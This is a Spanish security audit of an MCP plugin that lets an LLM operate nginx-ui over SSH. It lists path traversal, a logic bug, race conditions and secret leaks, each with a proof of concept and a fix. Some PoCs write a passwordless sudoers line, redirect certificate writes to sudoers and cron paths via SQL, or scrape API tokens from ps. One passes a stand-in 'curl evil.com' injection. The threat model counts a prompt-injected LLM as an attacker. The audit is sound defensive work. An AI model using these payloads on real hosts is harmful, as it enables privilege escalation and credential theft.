# Security Audit — `nginx-ui-ops-mcp` v0.4.0

## Resumen ejecutivo

`nginx-ui-ops-mcp` v0.4.0 es un plugin MCP que opera nginx-ui remotamente
a través de 3 backends (`wrapper-lxc`, `direct-ssh`, `docker-exec`). El
LLM invoca tools que, vía SSH, ejecutan comandos en el host destino,
escriben configs, gestionan certificados acme.sh y consultan SQLite de
nginx-ui. La nueva release añade multi-target + el backend `docker-exec`
(~330 LOC).

**Postura general**: **defensa adecuada para uso homelab personal, con
3 bugs accionables (uno funcional crítico, dos de hardening de
input validation)**. La arquitectura sigue patrones razonables —
mutation gate via env var, sudoers whitelist en el wrapper, tempfiles
con tokens random, validación de paths con prefijo de directorio. No
hay credenciales hardcodeadas, secretos en logs ni SQL injection
clásica.

### Top 3 issues

1. **`[VULN-01]` HIGH** — `nginx_write_file` valida path con `startswith()`
   pero **no resuelve `..`** en path. Un attacker (LLM comprometido por
   prompt injection, o cliente MCP malicioso) puede pasar
   `path="/etc/nginx/../etc/passwd"` y escribir fuera del config dir.
   La validación es bypassable trivialmente.

2. **`[VULN-02]` HIGH** — `nginx_logs()` **reasigna su propio parámetro
   `target`** (multi-target name) con el path del log file → llama
   `get_backend(<path>)` que falla con `BackendError`. La tool está
   **rota en producción** salvo que se invoque con file=None y en modo
   legacy. Los tests no lo detectan porque `get_backend` está mockeado
   (`lambda *a, **kw: f`).

3. **`[VULN-03]` MEDIUM** — `cert_deploy_files` confía en
   `ssl_certificate_path` y `ssl_certificate_key_path` leídos de la
   tabla `certs` de la DB sin validar prefijo. Si la DB es modificada
   (UI nginx-ui, otro proceso con write a la DB, attacker con SQL
   write), el plugin puede ser orquestado para escribir certs/keys
   en paths arbitrarios del host (`/root/.ssh/authorized_keys`, etc.).

---

## Threat model resumido

- **Activos**: vault de mimir-mcp (credenciales SSH/PVE/CF), DB SQLite
  de nginx-ui, configs nginx, certs/keys, control del proceso nginx.
- **Actores**:
  - LLM trusted (Claude) que invoca las tools — modelo confiable.
  - LLM con prompt injection — controla los args de las tools.
  - Operator humano (Jandro) — root del homelab, autoridad última.
  - Atacante remoto con acceso a la DB nginx-ui (vía UI nginx-ui,
    via shell en LXC).
  - Atacante con acceso a `~/.ssh/config` del operator — fuera de
    scope (compromiso total).
- **Trust boundaries**:
  - mimir vault → plugin subprocess (env vars).
  - plugin → SSH → host PVE / LXC / Docker container.
  - plugin → mutation gate (`NGINXUI_ALLOW_MUTATIONS`).
- **Exposición**: LOCAL (stdio del subprocess), no HTTP, no Internet.
  El blast radius es: lo que SSH puede tocar en el destino. Eso es
  amplio (sudoers whitelist o root del container Docker).

## Hallazgos HIGH

### `[VULN-01]` Path traversal en `nginx_write_file` via `..` no canonicalizado <a name="vuln-01"></a>

| Campo | Valor |
|-------|-------|
| **Severity** | HIGH |
| **Confidence** | HIGH |
| **Category** | Injection |
| **Location** | `nginx_ui_ops/tools/ops.py:84-90` |
| **CWE** | CWE-22 (Path Traversal) |

**Description:** La validación de `path` en `nginx_write_file` usa
`path.startswith("/")` + `path.startswith(config_dir + "/")` pero
**no canonicaliza** el path para resolver `..`. Un valor como
`/etc/nginx/../etc/passwd` pasa la check (empieza con `/etc/nginx/`)
pero al ejecutarse en el host, el shell lo resuelve y escribe en
`/etc/passwd`.

**Attack Vector:** Atacante con control sobre los args de la tool
(LLM bajo prompt injection, cliente MCP malicioso, o un wrapper
agente que pase datos no sanitizados) invoca:

```
nginx_write_file(
    path="/etc/nginx/../etc/sudoers.d/zzz-owned",
    content="claude ALL=(ALL) NOPASSWD: ALL"
)
```

El plugin lo acepta, hace backup, escribe el archivo (con sudo, mode
0644). Tras un nginx -t fail rollback se mantiene parcialmente:
**el archivo de destino queda escrito antes del test** (líneas 116-118),
y el rollback solo intenta restaurar el backup o `rm -f path` (línea
146) — eso último también es vulnerable a path traversal y borraría
`/etc/sudoers.d/zzz-owned` (lo que es bueno aquí accidentalmente).
Pero en el escenario sin "rollback rm" — cuando había backup previo
de `path` → `push_file(prior_content, path)` rewrite at the destino
también con traversal → escribe el contenido previo de `/etc/passwd`
encima de sí mismo, dejando el sudoers contaminado.

Caso operacional más simple: `path="/etc/nginx/../../../tmp/foo"` →
escribe en `/tmp/foo` sin ningún rollback porque no había prior file.

**PoC:**

```python
# pseudocódigo de invocación MCP (no destructivo):
import json
mcp_invoke("nginx_write_file", {
    "path": "/etc/nginx/../tmp/owned-by-nginx-ui-ops",
    "content": "# proof-of-concept marker\n",
})
# Resultado esperado: tool retorna ok=True (nginx -t pasa con un
# archivo random en /tmp), bytes_written=N. /tmp/owned-by-nginx-ui-ops
# existe con el contenido. NO se escribe en /etc/nginx/.
```

**Fix:** Canonicalizar antes de validar:

```python
import os.path

def _validate_under_config_dir(path: str) -> str:
    config_dir = _config_dir().rstrip("/")
    # 1. Reject relative paths
    if not path.startswith("/"):
        raise ValueError(f"path must be absolute, got {path!r}")
    # 2. Reject paths with traversal components — fail closed
    if ".." in path.split("/"):
        raise ValueError(f"path {path!r} contains '..' (traversal)")
    # 3. Resolve symlinks + normalize, then re-check prefix
    normalized = os.path.normpath(path)
    if not (normalized == config_dir or normalized.startswith(config_dir + "/")):
        raise ValueError(
            f"path {normalized!r} not under {config_dir!r} after normalization"
        )
    return normalized
```

Aplicar el mismo helper en `nginx_read_file`, `nginx_test_with_diff`
y cualquier futura tool que tome paths del cliente.

**Resolución:** _(rellenar al cerrar el hallazgo)_

### `[VULN-02]` `nginx_logs()` reasigna parámetro `target` rompiendo multi-target <a name="vuln-02"></a>

| Campo | Valor |
|-------|-------|
| **Severity** | HIGH |
| **Confidence** | HIGH |
| **Category** | Logic |
| **Location** | `nginx_ui_ops/tools/diagnostics.py:212-252` |
| **CWE** | CWE-665 (Improper Initialization) |

**Description:** La firma de la tool acepta `target: str \| None` como
4º param (target name del multi-target system). Dentro, las líneas
233 y 238 **reasignan la variable local `target` con el path del log
file** (`target = file` o `target = f"{log_dir}/{file}"`), y luego
línea 240 invoca `get_backend(target)` pasando ese path. La factory
valida que `target` esté en `NGINXUI_TARGETS` y lanza
`BackendError("target '/var/log/...' not in NGINXUI_TARGETS=...")`.

La tool está **funcionalmente rota** en cualquier modo (legacy o
multi-target) salvo que el operator inyecte el path completo como un
target name válido, lo cual no es práctico.

Los tests no detectan el bug porque `get_backend` está mockeado:

```python
# tests/test_tools_diagnostics.py
monkeypatch.setattr(diag, "get_backend", lambda *a, **kw: f)
```

La lambda ignora todos los args, devuelve el fake. Reemplazar el mock
por uno que valide args reproduciría el error real.

**Attack Vector:** Operacional, no exploit. Tras `pip install` y
configurar `NGINXUI_TARGETS=vps`, el LLM invoca
`nginx_logs(target="vps")` → `BackendError("target '/var/log/nginx/error.log' not in NGINXUI_TARGETS=['vps']")`. Tool inutilizable.

Severity HIGH no por exploit clásico sino por **régresión
silenciosa** que rompe una tool central de observability — clave para
incident response.

**PoC:**

```bash
# En un entorno con NGINXUI_TARGETS=vps + vars configuradas:
python -c "
import os
os.environ['NGINXUI_TARGETS'] = 'vps'
os.environ['NGINXUI_TARGET_VPS_BACKEND'] = 'docker-exec'
os.environ['NGINXUI_TARGET_VPS_DOCKER_SSH_ALIAS'] = 'hetzner'
os.environ['NGINXUI_TARGET_VPS_DOCKER_CONTAINER'] = 'nginx-ui'
from nginx_ui_ops.tools.diagnostics import nginx_logs
nginx_logs(target='vps')
# Expected: BackendError 'target /var/log/nginx/error.log not in NGINXUI_TARGETS'
"
```

**Fix:** Renombrar la variable local para no shadow el parámetro:

```python
def nginx_logs(
    file: str = "error.log",
    lines: int = 100,
    grep: str = "",
    target: str | None = None,
) -> dict[str, Any]:
    if not file or "\x00" in file:
        raise ValueError(f"invalid log file: {file!r}")
    lines = max(1, min(int(lines), MAX_LOG_LINES))

    # Resolve log file path — DO NOT shadow `target` parameter.
    if file.startswith("/"):
        log_path = file
    else:
        if ".." in file or "/" in file:
            raise ValueError(f"file must be a flat name, got {file!r}")
        log_path = f"{_log_dir().rstrip('/')}/{file}"

    backend = get_backend(target)  # ← correct: target is the instance name
    # ...rest of the body uses log_path instead of target
```

Añadir un test sin mock de `get_backend` (o con mock que valide args):

```python
def test_nginx_logs_passes_target_to_get_backend(monkeypatch):
    seen = {}
    def fake_get_backend(t=None):
        seen['target'] = t
        return MagicMock()
    monkeypatch.setattr(diag, "get_backend", fake_get_backend)
    diag.nginx_logs(file="error.log", target="vps")
    assert seen['target'] == "vps"  # not "/var/log/nginx/error.log"
```

**Resolución:** _(rellenar al cerrar el hallazgo)_

### `[VULN-03]` `cert_deploy_files` confía en paths DB-controlled sin validar prefijo <a name="vuln-03"></a>

| Campo | Valor |
|-------|-------|
| **Severity** | MEDIUM |
| **Confidence** | MEDIUM |
| **Category** | Authz |
| **Location** | `nginx_ui_ops/tools/certs.py:400-462` |
| **CWE** | CWE-22 (Path Traversal) / CWE-20 (Improper Input Validation) |

**Description:** `cert_deploy_files(cert_id)` lee
`ssl_certificate_path` y `ssl_certificate_key_path` directamente de
la tabla `certs` (líneas 429-430) y los usa como `dest_fullchain` /
`dest_key` para `push_file(... sudo=True)`. La DB es la fuente de
verdad confiable normalmente, pero un atacante con write a la DB —
vía la UI nginx-ui comprometida, vía SQL injection en otra tool,
vía shell en el LXC con acceso al .db — puede setear:

```sql
UPDATE certs SET
  ssl_certificate_path='/etc/sudoers.d/zzz-pwn.conf',
  ssl_certificate_key_path='/etc/cron.d/zzz-pwn'
WHERE id=42;
```

Luego un `cert_deploy_files(42)` legítimo (operator o LLM)
sobreescribiría esos paths con el contenido de fullchain.cer y .key.
El fullchain es un PEM válido — los parsers de sudoers/cron lo
rechazarían — pero el cuerpo del PEM contiene base64 que puede
provocar parsing edge cases. Más realista: cron.d corre `# bash` o
`MAILTO=` antes de fallar, dependiendo del contenido del PEM.

**Attack Vector:** Requiere write a la DB de nginx-ui (privilegio
existente para un atacante con shell en el LXC). Una vez ahí, espera
a que el operator dispare `cert_deploy_files` legítimo y escribe en
cualquier path con permisos root via el sudo del backend.

**PoC:**

```bash
# 1. (Asumir compromise previo del LXC) Modificar DB:
ssh pve "pct exec 104 -- sqlite3 /usr/local/etc/nginx-ui/database.db \
  \"UPDATE certs SET ssl_certificate_path='/tmp/owned-by-deploy' \
   WHERE id=1\""

# 2. Esperar a que el operator invoque cert_deploy_files(1) — no
# destructivo, pero demostraría el write fuera de paths esperados.

# 3. Verificación:
ssh pve "pct exec 104 -- cat /tmp/owned-by-deploy"
# Expected: contenido de fullchain.cer del cert 1, escrito por root.
```

**Fix:** Validar los paths de destino contra una allowlist de
prefijos plausibles ANTES de push:

```python
_ALLOWED_CERT_PREFIXES = (
    "/etc/nginx/",
    "/usr/local/etc/nginx-ui/",
    "/var/lib/nginx-ui/",
    # Add other operator-blessed locations
)

def _validate_cert_dest(path: str, kind: str) -> None:
    normalized = os.path.normpath(path)
    if ".." in path.split("/") or not any(
        normalized.startswith(p) for p in _ALLOWED_CERT_PREFIXES
    ):
        raise ValueError(
            f"refusing to deploy {kind} to {path!r} — "
            f"path not in allowed cert dirs: {_ALLOWED_CERT_PREFIXES}"
        )

# En cert_deploy_files:
_validate_cert_dest(dest_fullchain, "fullchain")
_validate_cert_dest(dest_key, "key")
```

Idealmente, hacer la lista configurable por env var con default seguro.

**Resolución:** _(rellenar al cerrar el hallazgo)_

### `[VULN-04]` `WrapperLXCBackend.read_file` corrompe bytes binarios via UTF-8 round-trip <a name="vuln-04"></a>

| Campo | Valor |
|-------|-------|
| **Severity** | MEDIUM |
| **Confidence** | HIGH |
| **Category** | Logic |
| **Location** | `nginx_ui_ops/backends/wrapper_lxc.py:334-343`, `nginx_ui_ops/backends/direct_ssh.py:248-255` |
| **CWE** | CWE-1287 (Improper Validation of Specified Type of Input) |

**Description:** El contrato ABC de `read_file` dice:

> Returns the bytes verbatim — no encoding conversion.

Pero la implementación en `WrapperLXCBackend` y `DirectSSHBackend`:

```python
def read_file(self, remote_path: str, *, sudo: bool = False) -> bytes:
    result = self.run_cmd(["cat", remote_path], sudo=sudo, timeout=30)
    ...
    return result.stdout.encode("utf-8")
```

El `result.stdout` es ya UTF-8 decoded (con `errors="replace"`)
desde el `_run_ssh`. Re-encode a UTF-8 NO recupera los bytes
originales si había secuencias no-UTF-8 — quedaron sustituidas por
U+FFFD (`\xef\xbf\xbd`).

**Impacto en certs**: los PEM son ASCII puro → OK.
**Impacto en keys**: PEM keys también ASCII → OK.
**Impacto en binary DB/DER/imágenes**: corrupción.

El backend `DockerExecBackend` (línea 257-278) lo hace correctamente
con `subprocess.run` sin `text=True`, devolviendo `proc.stdout`
crudo. Inconsistencia entre backends.

**Attack Vector:** No es exploit por terceros. Es bug de integridad:
si una futura tool añade lectura de DER certs (formato binario), o
de un blob binario almacenado por nginx-ui (algunos plugins lo
hacen), el plugin devolverá bytes corruptos sin avisar — el LLM
puede tomar decisiones basadas en data alterada.

**PoC:**

```python
# En un wrapper-lxc backend conectado a un LXC con un archivo .der:
backend = WrapperLXCBackend(...)
# Asumir /tmp/test.bin contiene b"\xff\xfe\x00\x01" (4 bytes no UTF-8)
got = backend.read_file("/tmp/test.bin")
assert got == b"\xff\xfe\x00\x01"  # falla — got contiene U+FFFD
```

**Fix:** Implementar `read_file` con un canal binario en lugar de
re-encode:

```python
def read_file(self, remote_path: str, *, sudo: bool = False) -> bytes:
    # Bypass run_cmd's text decoding. Run ssh directly with bytes-mode.
    inner = " ".join([
        shlex.quote(self.wrapper_path),
        "cat",
        shlex.quote(remote_path),
    ])
    remote = self._wrap_pct_exec(f"cat {shlex.quote(remote_path)}", sudo=sudo)
    argv = [self.ssh_bin, self.pve_ssh_alias, remote]
    try:
        proc = subprocess.run(argv, capture_output=True, timeout=30)
    except subprocess.TimeoutExpired as e:
        raise BackendError(f"ssh timeout reading {remote_path}") from e
    if proc.returncode != 0:
        raise BackendError(
            f"read_file {remote_path}: rc={proc.returncode} "
            f"stderr={proc.stderr.decode('utf-8', errors='replace')[:200]}"
        )
    return proc.stdout  # raw bytes preserved
```

Aplicar el mismo patrón en `DirectSSHBackend`.

**Resolución:** _(rellenar al cerrar el hallazgo)_

### `[VULN-05]` TOCTOU en `_acquire_acme_lock` permite issuance duplicada <a name="vuln-05"></a>

| Campo | Valor |
|-------|-------|
| **Severity** | MEDIUM |
| **Confidence** | HIGH |
| **Category** | Logic |
| **Location** | `nginx_ui_ops/tools/certs.py:266-272` |
| **CWE** | CWE-367 (Time-of-check Time-of-use Race Condition) |

**Description:** El "lock" es una secuencia de 2 ops separadas:

```python
def _acquire_acme_lock(backend: Any) -> bool:
    check = backend.run_cmd(["test", "-e", ACME_LOCK_PATH], timeout=5)
    if check.ok:
        return False
    touch = backend.run_cmd(["touch", ACME_LOCK_PATH], timeout=5)
    return touch.ok
```

Entre `test -e` (línea 268) y `touch` (línea 271) puede colarse otro
proceso. Ambos `test` ven el archivo ausente, ambos hacen `touch`, y
ambos creen tener el lock. Resultado: dos invocaciones simultáneas
de acme.sh para los mismos dominios → posible consumo doble de la
cuota Let's Encrypt (50/hora, 5 fallos consecutivos = backoff
exponencial).

**Attack Vector:** No es ataque externo per se. Es race condition
funcional: dos sesiones MCP concurrentes (mimir routing a 2 LLMs
simultáneos, o un script automatizado) compitiendo por el acme.
También: un attacker que controle uno de los LLMs puede provocar
deliberadamente el race para agotar la cuota LE del operator,
denyando renovaciones legítimas.

**PoC:**

```python
# Pseudocódigo — race intencional
import threading
from nginx_ui_ops.tools.certs import cert_issue

def issue():
    cert_issue(domains=["foo.example.com"], dns_provider="dns_cf")

threads = [threading.Thread(target=issue) for _ in range(5)]
for t in threads: t.start()
for t in threads: t.join()
# Expected: varios threads ven el lock vacío en el check, y todos
# llaman acme.sh; CF API recibe N requests, LE issuance counter
# avanza N veces.
```

**Fix:** Usar atomic creation. `mkdir` es POSIX-atomic en el mismo
filesystem:

```python
def _acquire_acme_lock(backend: Any) -> bool:
    """Atomic lock via mkdir. mkdir fails if directory exists."""
    res = backend.run_cmd(
        ["mkdir", ACME_LOCK_PATH],
        timeout=5,
    )
    return res.ok  # True = lock acquired; False = already held
```

Y cambiar `ACME_LOCK_PATH` a un nombre tipo `/tmp/nginx-ui-ops-acme.lock.d`.
Para release, sigue siendo `rm -rf` el directorio (o `rmdir` si está
vacío). Alternativa más robusta: `flock(1)` o un PID file con
verificación de proceso vivo.

**Resolución:** _(rellenar al cerrar el hallazgo)_

### `[VULN-06]` `acme_issue` env exports filtran secretos al shell remoto <a name="vuln-06"></a>

| Campo | Valor |
|-------|-------|
| **Severity** | LOW |
| **Confidence** | MEDIUM |
| **Category** | Secrets |
| **Location** | `nginx_ui_ops/backends/wrapper_lxc.py:438-440`, `nginx_ui_ops/backends/direct_ssh.py:330-332` |
| **CWE** | CWE-200 (Information Exposure) |

**Description:** `acme_issue` serializa los DNS provider secrets como
parte del comando shell remoto:

```python
env_exports = " && ".join(
    f"export {k}={shlex.quote(v)}" for k, v in provider_env.items()
)
cmd = f"{env_exports} && {acme_bin} --issue {...}"
result = self._run_ssh(cmd, timeout=300)
```

El comando completo `export CF_API_TOKEN=ghp_... && acme.sh --issue ...`
es:

1. **Visible en el argv del proceso sshd remoto** durante la ejecución
   (legible via `ps aux` por cualquier user del host hasta que el
   shell termine — segundos a minutos para acme.sh).
2. **Persistido en bash history** del shell remoto si HISTFILE está
   habilitado (normalmente sí en bash interactivo, no en exec mode
   SSH — pero auditd/secure logs SÍ pueden capturarlo).
3. **Capturado por logs de auditd/audisp** si el host audita
   ejecuciones de proceso (común en servidores hardened).

**Severity LOW** porque (a) el threat model homelab no incluye otros
users en el host PVE; (b) acme.sh debe ejecutar como un user con
sudo o root; (c) el operator confía en el host.

**Attack Vector:** Atacante con acceso a `ps aux` del host (otro
user no privilegiado en el LXC/host, o un timing-window con un script
batch) puede capturar el token CF/AWS en el momento del issuance.

**PoC:**

```bash
# En el host PVE (otro shell o auditd):
while true; do
    ps auxe | grep "CF_API_TOKEN" >> /tmp/leak.log
    sleep 0.1
done
# Triggear acme_issue desde el plugin → /tmp/leak.log captura el token.
```

**Fix:** Pasar secrets via `env` argument a un proceso hijo o via
un tempfile sourceable, no via shell line. La forma más limpia es
escribir un script wrapper a tempfile y ejecutarlo:

```python
def acme_issue(self, domains, *, key_type, dns_provider, provider_env, acme_home):
    ...
    # Build secrets env script — never in cmdline
    script_lines = []
    for k, v in provider_env.items():
        script_lines.append(f"export {k}={shlex.quote(v)}")
    script_lines.append(
        f"exec {acme_bin} --issue {domain_args} "
        f"--dns {shlex.quote(dns_provider)} ..."
    )
    script = "\n".join(script_lines).encode("utf-8")

    # Push to tempfile with mode 0700, execute via sh
    token = secrets.token_hex(8)
    tmp = f"/tmp/nui-acme-{token}.sh"
    self.push_file(script, tmp, mode=0o700)
    try:
        result = self._run_ssh(f"sh {shlex.quote(tmp)}", timeout=300)
    finally:
        self._run_ssh(f"rm -f {shlex.quote(tmp)}", timeout=5)
    ...
```

Trade-off: el tempfile existe brevemente en disco con los secretos
en plain. Mejor que cmdline porque (a) no visible en `ps`,
(b) chmod 0700 limita lectura al user del shell SSH.

**Resolución:** _(rellenar al cerrar el hallazgo)_

### `[VULN-07]` `acme_issue` BackendError surfacea stderr/stdout potencialmente con secretos <a name="vuln-07"></a>

| Campo | Valor |
|-------|-------|
| **Severity** | LOW |
| **Confidence** | LOW |
| **Category** | Secrets / Logging |
| **Location** | `nginx_ui_ops/backends/wrapper_lxc.py:461-465`, `nginx_ui_ops/backends/direct_ssh.py:345-349` |
| **CWE** | CWE-209 (Information Exposure Through an Error Message) |

**Description:** Cuando acme.sh falla, el error se serializa con el
contenido literal de stderr/stdout:

```python
raise BackendError(
    f"acme.sh --issue failed (rc={result.return_code}): "
    f"{result.stderr[:500] or result.stdout[:500]}"
)
```

acme.sh hace effort por redactar secrets en sus logs, pero algunos
providers DNS imprimen el token completo en mensajes de error de
debug (`-d` flag) o en wrappers de curl con `-v`. Si el operator
tiene `Le_Debug=1` o el provider plugin no redacta, el token va al
LLM → potencialmente al transcript de Anthropic → blast radius
expandido.

**Attack Vector:** Atacante que controle el provider DNS (o sea
capaz de provocar una resp HTTP que acme.sh imprima verbatim) puede
ex-filtrate tokens hacia el LLM, que termina en logs/telemetría.

**Confidence LOW** porque depende de comportamiento de acme.sh +
provider plugin que no controlas.

**Fix:** Redactor de stderr antes de surface:

```python
import re

_SECRET_RE = re.compile(
    r"(token|secret|key|password)[=:]\s*\S+",
    re.IGNORECASE,
)

def _redact(text: str) -> str:
    return _SECRET_RE.sub(lambda m: f"{m.group(1)}=<REDACTED>", text)

# Use:
raise BackendError(
    f"acme.sh --issue failed (rc={result.return_code}): "
    f"{_redact(result.stderr[:500] or result.stdout[:500])}"
)
```

Aplicar `_redact` también en notes y en cualquier log.

**Resolución:** _(rellenar al cerrar el hallazgo)_

### `[VULN-08]` `nginx_logs` `grep` vía `sh -c` — defense in depth débil <a name="vuln-08"></a>

| Campo | Valor |
|-------|-------|
| **Severity** | LOW |
| **Confidence** | MEDIUM |
| **Category** | Injection |
| **Location** | `nginx_ui_ops/tools/diagnostics.py:245-248` |
| **CWE** | CWE-78 (OS Command Injection) — mitigated by shlex.quote |

**Description:** El parámetro `grep` se pasa a `sh -c` con
`shlex.quote(grep)` aplicado. La defense es correcta a nivel local
(Python), pero el comando pasa luego por SSH + claude-wrapper
(eval-based) que vuelve a interpretar. La cadena `shlex.quote ->
wrapper.run_cmd shlex.quote -> ssh argv -> wrapper eval` tiene
varias capas y eval-prone en una de ellas.

Si el operator del wrapper-lxc tiene un `claude-wrapper` que hace
`eval "$@"` (común en setups antiguos), las comillas del segundo
nivel se pierden y `grep "$(curl evil.com)"` se interpreta.

**Attack Vector:** Requiere control sobre el arg `grep` (LLM con
prompt injection). El `claude-wrapper` debería rejectar comandos
desconocidos, pero un `grep` con args bash-special es válido para
el wrapper.

**Confidence MEDIUM** porque depende de la versión exacta del
`claude-wrapper.sh` del operator (no auditado aquí).

**PoC:** Requiere acceso al claude-wrapper.sh del operator —
fuera del scope estático.

**Fix:** Evitar el `sh -c` cuando posible. Hacer el filtro en Python:

```python
# Tail without grep (always)
cmd = ["tail", "-n", str(lines), log_path]
res = backend.run_cmd(cmd, sudo=True, timeout=15)
content_lines = res.stdout.splitlines()

# Apply grep client-side (after the SSH boundary)
if grep:
    try:
        pattern = re.compile(grep, re.IGNORECASE)
    except re.error as e:
        raise ValueError(f"invalid grep regex: {e}")
    content_lines = [l for l in content_lines if pattern.search(l)]
```

Trade-off: lee N líneas del log siempre (vs filtradas). Para
diagnóstico de error.log típicamente <5MB, irrelevante. Beneficio:
elimina la capa shell de la cadena.

**Resolución:** _(rellenar al cerrar el hallazgo)_

### `[VULN-12]` `_collect_provider_env` lee env vars por prefijo (sobre-amplio) <a name="vuln-12"></a>

| Campo | Valor |
|-------|-------|
| **Severity** | INFO |
| **Confidence** | MEDIUM |
| **Category** | Secrets |
| **Location** | `nginx_ui_ops/tools/certs.py:240-263` |

**Description:** `_collect_provider_env("dns_cf")` lee CUALQUIER
env var que empiece por `CF_` y la pasa al provider_env de acme.sh.
Si el operator tiene `CF_OTHER_SERVICE_TOKEN` no relacionado con
acme.sh, también va al subprocess.

Es over-collection. Severity INFO porque acme.sh ignora env vars
desconocidos.

**Fix:** Limitar a un set explícito por provider:

```python
_PROVIDER_VARS = {
    "dns_cf": {"CF_API_TOKEN", "CF_ZONE_ID", "CF_API_KEY", "CF_EMAIL", "CF_Account_ID"},
    "dns_aws": {"AWS_ACCESS_KEY_ID", "AWS_SECRET_ACCESS_KEY", "AWS_REGION", "AWS_SESSION_TOKEN"},
    ...
}

def _collect_provider_env(dns_provider: str) -> dict[str, str]:
    allowed = _PROVIDER_VARS.get(dns_provider, set())
    return {k: os.environ[k] for k in allowed if k in os.environ}
```

**Resolución:** _(rellenar al cerrar el hallazgo)_

### `[VULN-13]` Host key verification depende de `~/.ssh/config` del operator <a name="vuln-13"></a>

| Campo | Valor |
|-------|-------|
| **Severity** | INFO |
| **Confidence** | LOW |
| **Category** | Crypto |
| **Location** | All backends — `subprocess.run(["ssh", alias, ...])` |
| **CWE** | CWE-295 (Improper Certificate Validation) |

**Description:** El plugin invoca `ssh <alias> ...` directamente. La
verificación del host key depende de la `~/.ssh/known_hosts` y
`StrictHostKeyChecking` config del user que corre el subprocess
(operator). Si `StrictHostKeyChecking=accept-new` (default en
OpenSSH moderno) o `=no` (inseguro), un MITM en primera conexión
puede impersonar el host.

Severity INFO porque (a) ámbito homelab, (b) responsabilidad del
operator config SSH.

**Fix (recomendado pero opcional)**: documentar en README que los
aliases deben tener `StrictHostKeyChecking yes` configurado. O
inyectar el flag explícitamente:

```python
argv = [self.ssh_bin, "-o", "StrictHostKeyChecking=yes", self.pve_ssh_alias, remote_cmd]
```

Trade-off: rompe primer-uso si known_hosts no tiene el host.

**Resolución:** _(rellenar al cerrar el hallazgo)_

### `[VULN-14]` `nginx_write_file` backups con mode 0644 — riesgo de leak de secretos previos <a name="vuln-14"></a>

| Campo | Valor |
|-------|-------|
| **Severity** | INFO |
| **Confidence** | LOW |
| **Category** | Secrets |
| **Location** | `nginx_ui_ops/tools/ops.py:107` |
| **CWE** | CWE-732 (Incorrect Permission Assignment) |

**Description:** Los backups generados por `nginx_write_file` se
guardan con mode 0644. Si el archivo original tenía mode 0600 (un
include con `ssl_password_file` o similar), el backup queda
worldreadable.

`nginx_write_file` no debería operar sobre keys (eso es
`cert_deploy_files`), así que el riesgo es bajo. Pero el patrón es
incorrecto: preservar el mode del original sería más seguro.

**Fix:**

```python
# Antes de backup:
mode_res = backend.run_cmd(["stat", "-c", "%a", path], sudo=True, timeout=5)
prior_mode = 0o644  # default
if mode_res.ok:
    try:
        prior_mode = int(mode_res.stdout.strip(), 8)
    except ValueError:
        pass
backend.push_file(prior_content, backup_path, mode=prior_mode, sudo=True)
```

**Resolución:** _(rellenar al cerrar el hallazgo)_

## Limitaciones del audit

1. **Static-only** — no se probó contra target live. Algunos findings
   (especialmente VULN-08 sobre el wrapper eval-prone) requieren
   verificación con el wrapper real del operator para confirmar
   confidence HIGH.
2. **`claude-wrapper.sh` no auditado** — vive en el host PVE, no en
   este repo. Es trust boundary downstream del plugin. Su sudoers
   whitelist es el otro layer de defense para varios findings; un
   audit completo de la cadena requeriría también ese script.
3. **Threat model homelab** — la calibración de severidad asume
   uso personal. En un setup SaaS multi-tenant, VULN-03 y VULN-06
   subirían a HIGH/CRITICAL respectivamente.
4. **Sin pip-audit en este pase** — los lockfiles tienen versiones
   recientes (cryptography 42+, mcp, pydantic 2+), pero no se
   contrastó contra CVE feeds. Recomendado correr `pip-audit -r
   pyproject.toml` antes de cada release.
